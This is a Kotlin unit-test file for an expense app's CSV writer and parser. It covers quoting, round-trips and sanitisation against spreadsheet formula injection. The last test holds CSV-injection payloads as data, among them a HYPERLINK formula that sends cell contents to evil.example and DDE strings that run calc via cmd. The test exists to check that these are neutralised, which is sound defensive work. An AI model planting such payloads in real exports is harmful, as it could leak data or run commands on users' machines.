package com.vshpynta.expenses.api.util

import com.fasterxml.jackson.annotation.JsonPropertyOrder
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test

/**
 * Unit tests for [CsvOperations] covering the RFC-4180 round-trip,
 * spreadsheet-formula sanitisation, and the awkward edge cases (multi-line
 * cells, doubled quotes, optional trailing newline).
 */
class CsvOperationsTest {

    private val csv = CsvOperations()

    @JsonPropertyOrder("a", "b")
    data class TwoCol(val a: String, val b: String)

    @JsonPropertyOrder("h")
    data class OneCol(val h: String)

    @JsonPropertyOrder("date", "description", "amountMinor", "currency", "category")
    data class ExpenseRow(
        val date: String,
        val description: String,
        val amountMinor: Long,
        val currency: String,
        val category: String,
    )

    @JsonPropertyOrder("name", "templateKey")
    data class NullableRow(val name: String?, val templateKey: String?)

    @Test
    fun `should write header and rows with CRLF terminators`() {
        // When
        val out = csv.write(listOf(TwoCol("1", "2"), TwoCol("3", "4")))

        // Then
        assertThat(out).isEqualTo("a,b\r\n1,2\r\n3,4\r\n")
    }

    @Test
    fun `should quote cells containing commas, quotes, or newlines`() {
        // When
        val out = csv.write(
            listOf(
                OneCol("plain"),
                OneCol("a,b"),
                OneCol("with \"quote\""),
                OneCol("line1\nline2"),
            ),
        )

        // Then: only the cells that need quoting are quoted; embedded quotes are doubled
        assertThat(out).isEqualTo(
            "h\r\nplain\r\n\"a,b\"\r\n\"with \"\"quote\"\"\"\r\n\"line1\nline2\"\r\n"
        )
    }

    @Test
    fun `should sanitise leading characters that look like spreadsheet formulas`() {
        // When
        val out = csv.write(
            listOf(
                OneCol("=SUM(A1:A2)"),
                OneCol("+1"),
                OneCol("-1"),
                OneCol("@cmd"),
            ),
        )

        // Then: every dangerous prefix gets a literal apostrophe. Jackson
        // CSV's lenient quoting wraps the sanitised values in quotes
        // because they begin with a low-ASCII char; the quoting is valid
        // CSV and harmless to spreadsheets.
        assertThat(out).isEqualTo(
            "h\r\n\"'=SUM(A1:A2)\"\r\n\"'+1\"\r\n\"'-1\"\r\n\"'@cmd\"\r\n"
        )
    }

    @Test
    fun `should round-trip simple rows`() {
        // Given
        val rows = listOf(
            ExpenseRow("2026-04-30", "Lunch", 1500, "USD", "Food"),
            ExpenseRow("2026-04-29", "Bus", 200, "USD", "Transportation"),
        )

        // When
        val csvText = csv.write(rows)
        val parsed = csv.parse<ExpenseRow>(csvText)

        // Then
        assertThat(parsed).isEqualTo(rows)
    }

    @Test
    fun `should round-trip cells with commas, quotes, and newlines`() {
        // Given
        val rows = listOf(OneCol("a,b"), OneCol("with \"q\""), OneCol("line1\nline2"))

        // When
        val parsed = csv.parse<OneCol>(csv.write(rows))

        // Then
        assertThat(parsed).isEqualTo(rows)
    }

    @Test
    fun `should accept LF and CRLF line endings on parse`() {
        // Given: hand-rolled CSV using LF only
        val text = "a,b\n1,2\n3,4"

        // When
        val parsed = csv.parse<TwoCol>(text)

        // Then
        assertThat(parsed).containsExactly(TwoCol("1", "2"), TwoCol("3", "4"))
    }

    @Test
    fun `should ignore trailing empty line on parse`() {
        // Given
        val text = "a,b\r\n1,2\r\n"

        // When
        val parsed = csv.parse<TwoCol>(text)

        // Then: no spurious trailing empty row
        assertThat(parsed).containsExactly(TwoCol("1", "2"))
    }

    @Test
    fun `should return empty list for empty input`() {
        assertThat(csv.parse<OneCol>("")).isEmpty()
    }

    @Test
    fun `should round-trip null values as empty cells`() {
        // Given: a templated category-style row whose name is null
        val rows = listOf(
            NullableRow(name = null, templateKey = "food"),
            NullableRow(name = "Travel", templateKey = null),
        )

        // When
        val out = csv.write(rows)
        val parsed = csv.parse<NullableRow>(out)

        // Then: empty cells survive the round trip as null
        assertThat(out).isEqualTo("name,templateKey\r\n,food\r\nTravel,\r\n")
        assertThat(parsed).isEqualTo(rows)
    }

    @Test
    fun `should neutralise formula injection payloads in any string column`() {
        // Given: every string column carries a formula-injection payload of
        // a different shape — a HYPERLINK exfiltration attempt, a DDE
        // command-execution attempt, a leading-minus negation, and a
        // tab-prefixed value (also treated as a formula by Excel).
        val rows = listOf(
            ExpenseRow(
                date = "2026-04-30",
                description = "=HYPERLINK(\"http://evil.example/?leak=\"&A1, \"Click\")",
                amountMinor = 100,
                currency = "USD",
                category = "@SUM(1+1)*cmd|'/c calc'!A0",
            ),
            ExpenseRow(
                date = "2026-04-29",
                description = "-2+3+cmd|' /c calc'!A0",
                amountMinor = 200,
                currency = "USD",
                category = "\tEvil",
            ),
        )

        // When
        val out = csv.write(rows)

        // Then: every dangerous payload is prefixed with a literal
        // apostrophe so the spreadsheet renders the cell as text instead
        // of evaluating it. The leading apostrophe is the OWASP-recommended
        // CSV-injection mitigation (CVE-2014-3524 family).
        assertThat(out).contains("\"'=HYPERLINK")
        assertThat(out).contains("\"'@SUM")
        assertThat(out).contains("\"'-2+3")
        assertThat(out).contains("\"'\tEvil")
        // And no raw payload survives unescaped at the start of any cell.
        assertThat(out).doesNotContain(",=HYPERLINK")
        assertThat(out).doesNotContain(",@SUM")
        assertThat(out).doesNotContain(",-2+3")
    }
}

